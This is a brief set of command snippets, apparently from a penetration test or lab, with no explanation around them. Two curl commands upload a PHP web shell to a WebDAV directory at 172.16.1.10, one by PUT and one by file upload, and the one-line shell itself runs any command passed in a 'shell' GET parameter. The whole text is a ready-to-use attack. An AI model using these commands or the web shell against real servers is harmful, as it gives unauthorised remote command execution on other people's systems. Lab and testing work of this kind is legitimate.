```bash
curl -v -X PUT -d "<?php system(\$_GET["shell"]); ?>" http://172.16.1.10/webdav/shell.php
```
---
```bash
curl -v http://172.16.1.10/webdav/ --upload-file shell.php 
```

```php
"<?php system($_GET["shell"]); ?>"
```
